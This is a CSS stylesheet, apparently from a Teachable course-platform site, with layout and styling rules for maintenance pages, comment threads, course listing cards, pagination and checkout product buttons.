.preview-bar .v2-dropdown.open button.menu-trigger { background-color: rgb(73, 73, 73); outline: none; border-color: rgb(176, 176, 176); box-shadow: rgb(176, 176, 176) 0px 0px 3px; }

.preview-bar .preview-navbar-nav > li.v2-dropdown > ul.dropdown-menu li > a { color: rgb(51, 51, 51); font-size: 14px; display: block; padding: 3px 11px; clear: both; font-weight: 400; line-height: 1.42857; }

.preview-bar .preview-navbar-nav > li.v2-dropdown > ul.dropdown-menu li > a.bold { font-weight: 700; }

.preview-bar .preview-navbar-nav > li.v2-dropdown > ul.dropdown-menu li > a:hover, .preview-bar .preview-navbar-nav > li.v2-dropdown > ul.dropdown-menu li > a:focus { text-decoration: none; background-color: rgb(245, 245, 245); }

.preview-bar .edit-button { font-size: 14px; line-height: 14px; font-weight: 600; border-radius: 4px; background-color: rgb(33, 205, 156); color: rgb(51, 51, 51); cursor: pointer; transition: background-color 0.3s ease 0s; }

.preview-bar .edit-button:hover { background-color: rgb(24, 234, 174); }

.current-user-layout { display: grid; width: 100%; min-height: 100vh; grid-template-columns: 350px 1fr; grid-template-rows: 46px 1fr; grid-template-areas: "header header" "sidebar main"; }

.current-user-layout .student-settings-header { grid-area: header / header / header / header; }

.current-user-layout .course-sidebar { grid-area: sidebar / sidebar / sidebar / sidebar; margin-top: 46px; }

.current-user-layout .course-mainbar { grid-area: main / main / main / main; justify-self: start; margin-left: 0px; width: 100%; }

.current-user-layout .course-mainbar * { font-family: inherit !important; }

@media screen and (min-width: 768px) and (max-width: 991px) {
  .current-user-layout { grid-template-columns: 300px 1fr; }
}

@media screen and (max-width: 767px) {
  .current-user-layout { grid-template-columns: 1fr; grid-template-areas: "header" "main"; }
}

.alert-banner { height: 50px; border-bottom: 1px solid; position: relative; z-index: 10; }

.alert-banner a { text-decoration: underline; color: var(--obsidian); font-weight: 600; transition: all 0.3s ease 0s; }

@media screen and (max-width: 767px) {
  .alert-banner { height: auto; }
}

.current-user-banner { margin-top: -16px; margin-left: -40px; margin-right: -40px; }

@media screen and (max-width: 767px) {
  .current-user-banner { margin-top: -40px; }
}

.warning { background-color: var(--blush); border-color: var(--rose); }

.maintenance-page { background-color: rgb(43, 54, 54); color: rgb(255, 255, 255); display: table; height: 100%; min-height: 100%; width: 100%; text-align: center; }

.maintenance-page h3 { margin-top: 0px; text-align: center; }

.maintenance-page .inner { display: table-cell; vertical-align: top; }

.maintenance-page .inner h1 { color: rgb(255, 255, 255) !important; }

.maintenance-page .inner a, .maintenance-page .inner a:hover { text-decoration: underline; color: rgb(255, 255, 255) !important; }

@media screen and (min-width: 992px) {
  .maintenance-page .inner { vertical-align: middle; }
}

.maintenance-page .logo { max-height: 120px; max-width: 300px; margin-bottom: 18px; }

.maintenance-page .half-opaque { opacity: 0.5; }

.maintenance-page .hero { max-width: 500px; margin-left: auto; margin-right: auto; background-color: rgb(30, 166, 154); padding: 10px 50px 40px 40px; border-radius: 15px; text-align: left; margin-top: 40px; }

.maintenance-page .hero p { font-size: 1.4em; margin-bottom: 0px; }

.maintenance-page .hero h1, .maintenance-page .hero h2, .maintenance-page .hero h3, .maintenance-page .hero h4, .maintenance-page .hero h5 { font-size: 1.8em; color: rgb(255, 255, 255) !important; }

.unlaunched-page { color: rgb(255, 255, 255); background-color: rgb(33, 35, 56); display: flex; -webkit-box-orient: vertical; -webkit-box-direction: normal; flex-direction: column; -webkit-box-pack: center; justify-content: center; -webkit-box-align: center; align-items: center; min-height: 100vh; }

.unlaunched-page a { text-decoration: none; }

.unlaunched-page .top { -webkit-box-pack: center; justify-content: center; -webkit-box-flex: 1; flex-grow: 1; display: flex; -webkit-box-orient: vertical; -webkit-box-direction: normal; flex-direction: column; -webkit-box-align: center; align-items: center; }

.unlaunched-page .bottom { margin-bottom: 30px; }

.unlaunched-page .top, .unlaunched-page .bottom { margin-left: 10px; margin-right: 10px; }

.unlaunched-page .header { position: absolute; left: 0px; right: 0px; background-color: rgba(0, 0, 0, 0.15); }

.unlaunched-page .logged-in-as-student { font-size: 1.4rem; display: block; padding-top: 20px; padding-bottom: 20px; -webkit-box-flex: 1; flex-grow: 1; text-align: center; }

.unlaunched-page .logged-in-as-student a { text-decoration: underline; color: rgb(255, 255, 255); }

.unlaunched-page .navbar { -webkit-box-align: center; align-items: center; }

.unlaunched-page .navbar button { font-family: inherit; }

.unlaunched-page .navbar__menu__list, .unlaunched-page .navbar__menu__list .inner-menu { color: rgb(33, 35, 56); margin: 0px; padding: 0px; list-style: none; }

.unlaunched-page .navbar__menu__list li, .unlaunched-page .navbar__menu__list .inner-menu li { margin: 0px; padding: 0px; }

.unlaunched-page .navbar__menu__list .caret, .unlaunched-page .navbar__menu__list .inner-menu .caret, .unlaunched-page .menu-trigger .caret { display: inline-block; width: 0px; height: 0px; vertical-align: middle; border-top: 4px solid rgb(33, 35, 56); border-right: 4px solid transparent; border-left: 4px solid transparent; margin-left: 5px; }

@media only screen and (min-width: 768px) {
  .unlaunched-page .navbar__menu__list, .unlaunched-page .navbar__menu__list .inner-menu, .unlaunched-page .menu-trigger { font-size: 12px; }
}

.unlaunched-page h1, .unlaunched-page h2, .unlaunched-page p { text-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px; text-align: center; }

.unlaunched-page h1, .unlaunched-page h2 { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif; font-style: normal; font-weight: 600; }

.unlaunched-page h1 { color: rgb(107, 109, 124); font-size: 22px; line-height: 34px; }

.unlaunched-page h2 { color: rgb(255, 255, 255); font-size: 46px; line-height: 69px; }

.unlaunched-page p { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif; font-style: normal; font-weight: normal; font-size: 12.642px; line-height: 19px; color: rgb(203, 203, 208); margin-top: 10px; margin-bottom: 40px; max-width: 60%; }

.unlaunched-page a.btn-admin, .unlaunched-page .powered-by-wrapper { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif; font-style: normal; font-weight: bold; font-size: 14px; line-height: 21px; }

.unlaunched-page a.btn-admin { display: flex; -webkit-box-pack: center; justify-content: center; -webkit-box-align: center; align-items: center; width: 104px; height: 38px; border-radius: 54px !important; }

.unlaunched-page .powered-by-wrapper { color: rgba(255, 255, 255, 0.5); }

.unlaunched-page .powered-by-logo { display: inline-block; -webkit-mask: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/teachable-logomark-white.svg") center center / contain no-repeat; background-color: rgba(255, 255, 255, 0.5); width: 79px; height: 17.3px; vertical-align: -3px; }

.create-school { background-color: rgb(43, 54, 54); color: rgb(255, 255, 255); display: table; height: 100%; min-height: 100%; width: 100%; text-align: center; }

.create-school .inner { padding: 20px; display: table-cell; vertical-align: top; }

.create-school .inner h1, .create-school .inner h2, .create-school .inner h3, .create-school .inner h4, .create-school .inner h5 { color: rgb(255, 255, 255) !important; }

.create-school .inner a, .create-school .inner a:hover { text-decoration: underline; color: rgb(255, 255, 255) !important; }

@media screen and (min-width: 992px) {
  .create-school .inner { vertical-align: middle; }
}

.create-school .logo { max-height: 120px; max-width: 500px; margin-bottom: 18px; }

.create-school .hero { max-width: 500px; margin-left: auto; margin-right: auto; background-color: rgb(30, 166, 154); padding: 20px 50px 30px; border-radius: 15px; }

.create-school .hero p { font-size: 1.4em; }

.create-school .hero h1, .create-school .hero h2, .create-school .hero h3, .create-school .hero h4, .create-school .hero h5 { font-size: 1.8em; color: rgb(255, 255, 255) !important; }

.comments { padding-bottom: 30px; }

.comments .comment-arrow-border, .comments .comment-arrow { display: block; width: 0px; height: 0px; border-style: solid; border-top-color: transparent; border-bottom-color: transparent; }

.comments .comment-arrow-border { position: absolute; left: -12px; top: 22px; border-width: 12px 12px 12px 0px; }

.comments .comment-arrow { position: relative; top: -10px; left: 2px; border-width: 10px 10px 10px 0px; border-right-color: rgb(239, 211, 186); }

.comments .comments__heading { font-weight: 600; margin-top: 15px; margin-bottom: 30px; font-size: 18px; }

.comments .comments__heading .comments-pagination-link { cursor: pointer; }

.comments .comments__wrapper { max-width: 1000px; margin: auto; }

.comments .comments__wrapper .comments__block { margin-top: 30px; margin-bottom: 35px; display: flex; -webkit-box-orient: horizontal; -webkit-box-direction: normal; flex-direction: row; }

.comments .comments__wrapper .comments__block .commenter-profile { display: inline-block; width: 100px; height: auto; text-align: center; }

.comments .comments__wrapper .comments__block--indent-level-1 { margin-left: 90px; }

.comments .comments__wrapper .comments__block--indent-level-2 { margin-left: 180px; }

.comments .comments__wrapper .comments__block--indent-level-3 { margin-left: 270px; }

.comments .comments__wrapper .comments__block--student .comments__block-box { border: 1px solid var(--subtle); background-color: var(--fog); }

.comments .comments__wrapper .comments__block--student .comment-arrow-border { border-right-color: var(--subtle); }

.comments .comments__wrapper .comments__block--student .comment-arrow-border .comment-arrow { border-right-color: var(--fog); }

.comments .comments__wrapper .comments__block--student hr { border-top-color: var(--subtle); }

.comments .comments__wrapper .comments__block--owner .comments__block-box, .comments .comments__wrapper .comments__block--author .comments__block-box { background: rgb(255, 248, 242); border: 1px solid rgb(239, 211, 186); }

.comments .comments__wrapper .comments__block--owner .comments__block-box .comment-arrow-border, .comments .comments__wrapper .comments__block--author .comments__block-box .comment-arrow-border { border-right-color: rgb(239, 211, 186); }

.comments .comments__wrapper .comments__block--owner .comments__block-box .comment-arrow-border .comment-arrow, .comments .comments__wrapper .comments__block--author .comments__block-box .comment-arrow-border .comment-arrow { border-right-color: rgb(255, 248, 242); }

.comments .comments__wrapper .comments__block--owner .comments__block-box hr, .comments .comments__wrapper .comments__block--author .comments__block-box hr { border-top-color: rgb(239, 211, 186); }

.comments .comments__wrapper .comments__block--owner .comments__block-box__meta-tag-instructor, .comments .comments__wrapper .comments__block--author .comments__block-box__meta-tag-instructor { display: block; padding: 2px 12px; border-radius: 30px; border: 1px solid rgb(239, 211, 186); color: rgb(253, 123, 72); font-size: 13px; line-height: 24px; margin: 0px auto 10px; background-color: rgb(255, 248, 242); }

@media screen and (max-width: 992px) {
  .comments .comments__wrapper .comments__block--owner .comments__block-box__meta-tag-instructor, .comments .comments__wrapper .comments__block--author .comments__block-box__meta-tag-instructor { display: inline-block; margin-left: 14px; margin-top: 8px; }
}

.comments .comments__wrapper .comments__block--awaiting_review .comments__block-box { background: rgb(255, 243, 217); border: 1px solid rgb(239, 211, 186); }

.comments .comments__wrapper .comments__block--awaiting_review .comments__block-box .comment-arrow-border { border-right-color: rgb(239, 211, 186); }

.comments .comments__wrapper .comments__block--awaiting_review .comments__block-box .comment-arrow-border .comment-arrow { border-right-color: rgb(255, 243, 217); }

.comments .comments__wrapper .comments__block--awaiting_review .comments__block-box hr { border-top-color: rgb(239, 211, 186); }

.comments .comments__wrapper .comments__block--awaiting_review .comments__block-box__meta-tag-review { display: block; }

.comments .comments__wrapper .comments__block img.gravatar { border-radius: 50%; width: 60px; height: 60px; margin: 0px auto 10px; }

.comments .comments__wrapper .comments__block hr { display: block; margin: 0px auto; padding: 0px; width: 100%; }

.comments .comments__wrapper .comments__block ul.comment-attachments { display: block; width: 98%; margin: 0px auto; padding: 20px 15px; list-style: none; }

.comments .comments__wrapper .comments__block ul.comment-attachments li { display: inline-block; height: 60px; margin: 0px 8px 0px 0px; padding: 0px; box-sizing: border-box; }

.comments .comments__wrapper .comments__block ul.comment-attachments li img { height: 60px; border-radius: 3px; }

.comments .comments__wrapper .comments__block-box { background: rgb(248, 248, 248); border-radius: 5px; padding: 0px; margin-left: 25px; width: 99%; font-size: 15px; position: relative; }

.comments .comments__wrapper .comments__block-box .alert { display: none; padding: 10px 15px; margin-top: 12px; margin-bottom: 12px; border: none; }

.comments .comments__wrapper .comments__block-box .alert-success { background: none; }

.comments .comments__wrapper .comments__block-box .alert-success { padding: 18px 15px; margin-top: 12px; margin-bottom: 12px; border: none; text-align: center; background: none; color: rgb(30, 166, 154); }

.comments .comments__wrapper .comments__block-box .alert-success i.fa { font-size: 60px; width: 100px; height: 100px; left: 0px; text-align: center; margin: auto auto 30px; display: block; line-height: 100px; font-weight: 100; border-radius: 50%; z-index: 5000; color: rgb(255, 255, 255); background: rgb(30, 166, 154); }

.comments .comments__wrapper .comments__block-box .alert img { width: 18px; margin-left: 4px; opacity: 0.3; }

.comments .comments__wrapper .comments__block-box::after { border-color: rgba(136, 183, 213, 0) rgb(248, 248, 248) rgba(136, 183, 213, 0) rgba(136, 183, 213, 0); border-width: 13px; margin-top: -10px; }

.comments .comments__wrapper .comments__block-box__body { padding: 15px 20px; text-align: left; white-space: pre-wrap; }

.comments .comments__wrapper .comments__block-box__meta { font-weight: 600; font-size: 16px; margin-bottom: 5px; line-height: 23px; height: 25px; color: rgb(99, 108, 131); padding: 15px 20px 0px; }

.comments .comments__wrapper .comments__block-box__meta-name { float: left; }

.comments .comments__wrapper .comments__block-box__meta-tag { margin-left: 10px; float: left; padding: 4px 7px; line-height: 12px; display: none; }

.comments .comments__wrapper .comments__block-box__meta-time, .comments .comments__wrapper .comments__block-box__meta-now { color: rgb(175, 183, 206); float: left; font-size: 14px; font-weight: 300; line-height: 21px; margin-left: 15px; }

.comments .comments__wrapper .comments__block-box__meta-time a, .comments .comments__wrapper .comments__block-box__meta-now a { color: rgb(183, 183, 183); }

.comments .comments__wrapper .comments__block-box__meta-now { display: none; }

.comments .comments__wrapper .comments__block-box__meta-actions { display: inline-block; float: right; font-size: 14px; line-height: 13px; }

.comments .comments__wrapper .comments__block-box__meta-actions a { display: inline-block; text-align: center; }

.comments .comments__wrapper .comments__block-box__meta-actions a .comment-action-tooltip { display: block; position: relative; top: 6px; opacity: 0; }

.comments .comments__wrapper .comments__block-box__meta-actions a:hover .comment-action-tooltip { opacity: 1; }

.comments .comments__wrapper .comments__block-box__meta-actions-edit, .comments .comments__wrapper .comments__block-box__meta-actions-delete, .comments .comments__wrapper .comments__block-box__meta-actions-permalink { color: rgb(153, 153, 153); }

.comments .comments__wrapper .comments__block-box__meta-actions-edit:hover, .comments .comments__wrapper .comments__block-box__meta-actions-delete:hover, .comments .comments__wrapper .comments__block-box__meta-actions-permalink:hover { color: rgb(115, 115, 115); }

.comments .comments__wrapper .comments__block-box form { margin: 15px 20px; }

.comments .comments__wrapper .comments__block-box input[type="submit"] { margin: 0px 0px 25px; }

.comments .comments__wrapper .comments__block-box .comment-editor { display: block; margin-bottom: 12px; }

.comments .comments__wrapper .comments__block-box .comment-editor textarea { border-radius: 5px 5px 0px 0px; border: 1px solid rgb(215, 215, 215); padding: 14px; font-size: 15px; height: 120px; width: 100%; margin-bottom: 0px; }

.comments .comments__wrapper .comments__block-box .comment-editor textarea:focus { outline: 0px; }

.comments .comments__wrapper .comments__block-box .comment-editor .attachments-editor { display: block; width: 100%; margin: -5px auto 0px; padding: 10px; border-style: solid; border-color: rgb(215, 215, 215); border-width: 0px 1px 1px; border-radius: 0px 0px 5px 5px; background-color: var(--fog); }

.comments .comments__wrapper .comments__block-box .comment-editor .attachments-editor .add-attachment { display: inline-block; margin: 6px 8px 0px 10px; width: 36px; height: 50px; padding: 4px 0px; float: left; }

.comments .comments__wrapper .comments__block-box .comment-editor .attachments-editor .attachments { display: inline-block; height: 50px; width: 86%; margin: 0px auto; padding: 3px 0px 0px; list-style: none; }

.comments .comments__wrapper .comments__block-box .comment-editor .attachments-editor .attachments li { position: relative; display: inline-block; margin: 0px 0px 0px 8px; padding: 0px; max-height: 50px; max-width: 50px; }

.comments .comments__wrapper .comments__block-box .comment-editor .attachments-editor .attachments li img { height: 43px; border-radius: 3px; margin: 0px auto; }

.comments .comments__wrapper .comments__block-box .comment-editor .attachments-editor .attachments li:hover { background-color: rgb(255, 255, 255); }

.comments .comments__wrapper .comments__block-box .comment-editor .attachments-editor .attachments li:hover img { opacity: 0.5; }

.comments .comments__wrapper .comments__block-box .comment-editor .attachments-editor .attachments li:hover::after { position: absolute; display: block; top: 5px; left: 0px; right: 0px; margin: 0px auto; padding: 0px; }

@media screen and (max-width: 992px) {
  .comments .comments__wrapper .comments__block { -webkit-box-orient: vertical; -webkit-box-direction: normal; flex-direction: column; }
  .comments .comments__wrapper .comments__block .comment-arrow-border, .comments .comments__wrapper .comments__block .comment-arrow { display: none; }
  .comments .comments__wrapper .comments__block .commenter-profile { width: 100%; margin-bottom: 10px; text-align: left; height: 45px; }
  .comments .comments__wrapper .comments__block .commenter-profile img.gravatar { display: inline-block; float: left; width: 45px; height: 45px; }
  .comments .comments__wrapper .comments__block__alert--posted, .comments .comments__wrapper .comments__block__alert--posted { margin-top: 0px; display: none !important; }
  .comments .comments__wrapper .comments__block .comments__block-box { margin-left: 0px; padding: 20px 25px; }
  .comments .comments__wrapper .comments__block .comments__block-box--owner::after, .comments .comments__wrapper .comments__block .comments__block-box--author::after { border-bottom-color: rgb(249, 248, 240); }
  .comments .comments__wrapper .comments__block .comments__block-box--awaiting_review { margin-top: 0px; }
  .comments .comments__wrapper .comments__block .comments__block-box--awaiting_review::after { border-bottom-color: rgb(255, 243, 217); }
}

@media screen and (max-width: 767px) {
  .comments .comments__wrapper .comments__block { margin-top: 15px; margin-bottom: 25px; }
  .comments .comments__wrapper .comments__block .comments__block-box { background-color: transparent; border-width: 0px; border-radius: 0px; margin-left: 0px; padding: 0px; }
  .comments .comments__wrapper .comments__block.comments__block--indent-level-1 { border-left: 1px solid var(--subtle); padding-left: 8px; margin-left: 60px !important; }
  .comments .comments__wrapper .comments__block.comments__block--indent-level-2 { border-left: 1px solid var(--subtle); padding-left: 8px; margin-left: 90px !important; }
  .comments .comments__wrapper .comments__block.comments__block--indent-level-3 { border-left: 1px solid var(--subtle); padding-left: 8px; margin-left: 120px !important; }
}

@-webkit-keyframes zoomShow { 
  100% { transform: scale(1); }
}

@keyframes zoomShow { 
  100% { transform: scale(1); }
}

.bg-all { margin-top: -40px; margin-bottom: -40px; padding-bottom: 40px; padding-top: 40px; }

.course-block, .block { padding-bottom: 50px; padding-top: 50px; background-color: rgb(255, 255, 255); }

.course-block.homepage_hero, .course-block.hero, .course-block.coupon_banner, .course-block.liquid_html, .course-block.html, .course-block.liquid, .course-block.full_width_image, .course-block.embedded_form, .course-block.email_leads_form, .course-block.checkout_button, .block.homepage_hero, .block.hero, .block.coupon_banner, .block.liquid_html, .block.html, .block.liquid, .block.full_width_image, .block.embedded_form, .block.email_leads_form, .block.checkout_button { padding-top: 0px; padding-bottom: 0px; background-color: transparent; }

.course-block.coupon_banner, .block.coupon_banner { display: none; }

.course-block.odd-stripe, .block.odd-stripe { background-color: rgb(247, 247, 247); }

.course-block.even-stripe, .block.even-stripe { background-color: rgb(255, 255, 255); }

.course-block.bio .author-name, .block.bio .author-name { margin-top: 10px; font-size: 18px; font-weight: bold; }

.course-block.checkout h2, .block.checkout h2 { text-align: center; font-weight: bold; }

.course-block.checkout h2.no-products, .block.checkout h2.no-products { margin-bottom: 70px; }

.course-block.video_embed h2, .block.video_embed h2 { font-size: 26px; font-weight: 600; }

@media screen and (max-width: 767px) {
  .course-block.video_embed .wistia_embed, .block.video_embed .wistia_embed { max-width: 100%; }
}

.course-block .full-width-image-bg, .block .full-width-image-bg { padding-top: 100px; padding-bottom: 100px; color: rgb(255, 255, 255); position: relative; background-size: cover !important; background-position: center center !important; }

.course-block .full-width-image-bg.embedded-form, .block .full-width-image-bg.embedded-form { padding-top: 20px; padding-bottom: 40px; }

.course-block .full-width-image-bg.embedded-form .preenrollment-form-wrapper, .block .full-width-image-bg.embedded-form .preenrollment-form-wrapper { background: none; }

.course-block .full-width-image-bg.embedded-form .preenrollment-form-wrapper .btn-primary.btn-hg, .block .full-width-image-bg.embedded-form .preenrollment-form-wrapper .btn-primary.btn-hg { text-transform: uppercase; font-size: 18px !important; }

.course-block .full-width-image-bg.background-not-set h3.signup-form-title, .block .full-width-image-bg.background-not-set h3.signup-form-title { color: rgb(43, 54, 54) !important; }

.course-block .checkout-button, .block .checkout-button { padding-top: 100px; padding-bottom: 100px; color: rgb(255, 255, 255); position: relative; background-size: cover !important; background-position: center center !important; }

.course-block .checkout-button.background-not-set h3.signup-form-title, .block .checkout-button.background-not-set h3.signup-form-title { color: rgb(43, 54, 54) !important; }

.course-block.testimonial .large-img-rounded, .block.testimonial .large-img-rounded { width: 100px; height: 100px; }

.course-block.testimonial p.testimonial-quote, .block.testimonial p.testimonial-quote { font-size: 20px; margin-top: 7px; line-height: 30px; }

.course-block.featured_courses, .block.featured_courses { text-align: center; }

.course-block.featured_courses .container h2, .block.featured_courses .container h2 { margin-top: 0px; padding-bottom: 20px; font-weight: 200; font-size: 31px; }

@media screen and (max-width: 767px) {
  .course-block img, .block img { display: block; margin: auto; max-width: 100%; }
}

.enrolled-in-course-alert { text-align: center; position: fixed; bottom: 0px; width: 100%; z-index: 99; line-height: 14px; padding-right: 20px; padding-left: 20px; }

.audioloader__audio { width: 100%; }

.audioloader__button { border: 0px; cursor: pointer; outline: 0px; background: transparent; }

.audioloader__name { margin-left: 5px; }

.audioloader__placeholder { -webkit-box-align: center; align-items: center; background-color: rgb(249, 249, 249); color: rgb(80, 80, 80); display: flex; height: 32px; margin-bottom: 6px; padding-left: 16px; width: 100%; }

[data-pdfviewer] { height: calc(100vh - 100px); }

[data-imageloader] { opacity: 0; transition: opacity 800ms ease-out 0s; will-change: opacity; }

.is-loaded[data-imageloader] { opacity: 1; }

.course-box__footer { padding: 16px; }

.course-listing { background-color: rgb(247, 247, 247); box-shadow: rgb(196, 229, 226) 0px 1px; border: 1px solid rgb(196, 229, 226); padding: 0px; border-radius: 9px; cursor: pointer; margin-bottom: 50px; height: 390px; position: relative; }

.course-listing.bundle { height: 335px; }

.course-listing:hover { box-shadow: rgb(120, 203, 196) 0px 0px 0px 1px; border: 1px solid rgb(120, 203, 196); transition: all 0.1s linear 0s; }

.course-listing:hover .course-listing-title { color: rgb(30, 166, 154); transition: all 0.1s linear 0s; }

.course-listing .course-box-image-container { overflow: hidden; max-height: 208px; }

.course-listing .course-box-image-container .course-box-image { display: block; margin: auto; border-top-left-radius: 9px; border-top-right-radius: 9px; border-bottom: 1px solid rgb(237, 237, 237); width: 100%; }

.course-listing .course-box-image-container .bundle-icon-container { position: absolute; right: 24px; top: 8px; }

.course-listing .course-box-image-container .bundle-icon-container .tooltiptext::after { content: ""; position: absolute; bottom: 100%; left: 50%; margin-left: -5px; border-width: 5px; border-style: solid; border-color: transparent transparent var(--squid-ink) transparent; }

.course-listing .course-box-image-container .bundle-icon-container .tooltiptext { visibility: hidden; width: 120px; background-color: var(--squid-ink); color: var(--clinical); text-align: center; padding: 8px; border-radius: 6px; position: absolute; z-index: 1; top: 135%; left: 50%; margin-left: -60px; opacity: 0; transition: opacity 0.3s ease 0s; }

.course-listing .course-box-image-container .bundle-icon-container:hover .tooltiptext { visibility: visible; opacity: 1; }

.course-listing .course-box-image-container .bundles-icon { width: 30px; height: 30px; padding: 8px; border-radius: 100%; background-color: var(--squid-ink); color: var(--clinical); }

.course-listing .course-listing-title { color: rgb(43, 54, 54); line-height: 25px; padding: 16px 16px 4px; font-weight: bold; font-size: 18px; max-height: 65px; overflow: hidden; -webkit-box-orient: vertical; -webkit-line-clamp: 2; }

.course-listing .course-listing-subtitle, .course-listing .listing-desc { color: rgb(88, 111, 111); padding: 5px 16px; font-weight: 200; font-size: 14px; overflow: hidden; display: -webkit-box; -webkit-box-orient: vertical; -webkit-line-clamp: 2; max-height: 45px; }

.course-listing .course-listing-subtitle { min-height: 0px; }

.course-listing .course-listing-extra-info { display: flex; -webkit-box-pack: justify; justify-content: space-between; bottom: 0px; left: 0px; padding: 16px; position: absolute; width: 100%; }

.course-listing .course-listing-extra-info .img-circle { width: 30px; height: 30px; }

.course-listing .course-listing-extra-info .course-author-name { max-height: 30px; max-width: 225px; line-height: 30px; font-weight: 200; font-size: 15px; text-overflow: ellipsis; overflow: hidden; white-space: nowrap; margin-left: 5px; }

.course-listing .course-listing-extra-info .course-price { color: rgb(35, 161, 150); font-size: 15px; font-weight: bold; max-width: 120px; padding-top: 5px; }

.course-listing .course-listing-extra-info .course-progress { color: rgb(30, 166, 154); font-size: 11px; font-weight: normal; text-align: right; }

.course-listing .course-listing-extra-info .course-progress .percentage { font-size: 18px; line-height: 19px; font-weight: bold; }

.course-listing .course-listing-extra-info .course-bundle { line-height: 30px; font-size: 15px; font-weight: 200; }

.course-listing .course-listing-enrolled { padding-bottom: 100px; }

.course-listing .course-access-limit { font-size: 12.642px; line-height: 19px; color: rgb(88, 111, 111); padding-top: 10px; }

@media (min-width: 0px) and (max-width: 767px) {
  .course-listing { height: auto !important; }
  .course-listing .course-box-image-container { max-height: none !important; }
  .course-listing .course-listing-subtitle { margin-bottom: 70px; max-height: 85px; min-height: 85px; -webkit-line-clamp: 4; }
  .course-listing .course-listing-extra-info { position: relative; }
}

.view-directory .course-listing { background-color: rgba(255, 255, 255, 0.7); }

.course-single > div { margin-left: 33.33%; }

@media screen and (min-width: 0px) and (max-width: 767px) {
  .course-listing.bundle { height: 380px; }
  .course-single > div { margin-left: auto; }
}

@media screen and (min-width: 768px) and (max-width: 992px) {
  .course-listing.bundle .course-listing-subtitle { max-height: 44px; }
  .course-single > div { margin-left: 25%; }
}

@media screen and (min-width: 992px) and (max-width: 1200px) {
  .course-listing .course-author-name { width: 120px !important; }
}

@media screen and (min-width: 768px) {
  .course-listing.bundle { height: 400px !important; }
}

.filter-label { font-size: 21px; margin-right: 10px; color: rgb(152, 152, 152); float: left; }

.course-filter { padding: 5px 16px 6px 15px; background: rgb(255, 255, 255); border-radius: 20px; margin-bottom: 25px; margin-left: 15px; }

.course-filter .dropdown-menu li a { color: black; line-height: 26px; font-size: 15px; padding-left: 15px; text-transform: capitalize; }

.btn-default.btn-lg.btn-course-filter.dropdown-toggle { background: none; border: 0px; padding: 0px; font-size: 21px; top: 3px; text-transform: capitalize; color: rgb(30, 166, 154) !important; }

.btn-default.btn-lg.btn-course-filter.dropdown-toggle:focus { outline: -webkit-focus-ring-color auto 5px; }

.btn-default.btn-lg.btn-course-filter.dropdown-toggle:hover, .btn-default.btn-lg.btn-course-filter.dropdown-toggle:active { outline: 0px; background: none !important; border: 0px !important; box-shadow: none !important; }

.open .btn-default.btn-lg.btn-course-filter.dropdown-toggle { color: rgb(43, 54, 54); box-shadow: none !important; background: none !important; }

.pagination { background: rgb(255, 255, 255); border-radius: 30px; margin-top: 40px; margin-bottom: 60px; font-size: 16px; font-weight: bold; color: rgb(43, 54, 54); }

.pagination .previous_page, .pagination .current, .pagination a { padding: 12px 20px 10px; display: inline-block; border-right: 1px solid rgb(222, 232, 233); margin-right: -4px; }

.pagination .first a { border-top-left-radius: 30px; border-bottom-left-radius: 30px; }

.pagination .last a { padding: 12px 20px 10px; display: inline-block; border-top-right-radius: 30px; border-bottom-right-radius: 30px; margin-right: 0px; border-right: 0px !important; }

.pagination .current, .pagination a:hover { background: rgb(30, 166, 154); color: rgb(255, 255, 255); }

.pagination .disabled { opacity: 0.5; }

.product-list { margin: 0px 0px 45px; padding: 20px 0px 0px; }

.checkout-button-group { color: rgb(43, 54, 54); background: rgb(240, 240, 240); width: 100%; border-width: 0px 0px 1px; border-top-style: initial; border-right-style: initial; border-left-style: initial; border-top-color: initial; border-right-color: initial; border-left-color: initial; border-image: initial; padding: 0px; box-shadow: none; border-radius: 0px; border-bottom-style: solid; border-bottom-color: white; font-size: 15px; text-align: left; transition: all 0.1s linear 0s; user-select: text; }

.checkout-button-group input[type="radio"] { display: none !important; }

.checkout-button-group .product-radio, .checkout-button-group .product-details, .checkout-button-group .product-price { padding: 19px 16px; }

.checkout-button-group .product-radio { text-align: center; max-width: 80px; }

.checkout-button-group .product-radio .custom-radio { top: 8px; }

.checkout-button-group .product-details { border-left: 1px solid white; border-right: 1px solid white; }

.checkout-button-group .product-details h3.product-name { margin-top: 0px; margin-right: 0px; margin-left: 0px; font-size: 17px; font-weight: bold; white-space: normal; line-height: 22px; margin-bottom: 10px !important; }

.checkout-button-group .product-details h3.product-name .discount { font-weight: normal; text-transform: uppercase; font-size: 13px; margin-left: 8px; color: rgb(57, 154, 95); }

.checkout-button-group .product-details p.description { font-size: 15px; margin-bottom: 0px; white-space: normal; line-height: 22px; }

.checkout-button-group .product-details .detailed-description { display: none; color: rgb(127, 140, 141); font-weight: 200; font-size: 14px; margin-top: 10px; white-space: normal; }

.checkout-button-group .product-details .detailed-description p { white-space: normal; font-size: 16px; line-height: 22px; }

.checkout-button-group .product-details .detailed-description li { white-space: initial; line-height: 21px; margin-bottom: 4px; }

.checkout-button-group .product-details .detailed-description img { max-width: 100%; }

.checkout-button-group .product-price { margin: 0px; font-size: 15px; font-weight: bold; text-align: center; padding: 19px 16px; font-style: italic; color: rgb(150, 150, 150); overflow-y: auto; white-space: normal; }

.checkout-button-group:hover { background: rgb(240, 240, 240); color: black; }

.checkout-button-group:active { background: rgb(230, 230, 230); color: black; box-shadow: none; }

.checkout-button-group:active .custom-radio { box-shadow: rgb(204, 204, 204) 0px 0px 5px inset; }

.checkout-button-group .discounted-price { color: rgb(48, 129, 134); }

.checkout-button-group .product-enroll { display: none; }

.checkout-button-group.active { background-color: rgba(30, 166, 154, 0.15); color: rgb(43, 54, 54); box-shadow: none; }

.checkout-button-group.active h3.product-name, .checkout-button-group.active p.description, .checkout-button-group.active .product-price { color: rgb(30, 166, 154); }

.checkout-button-group.active .detailed-description { display: block; }

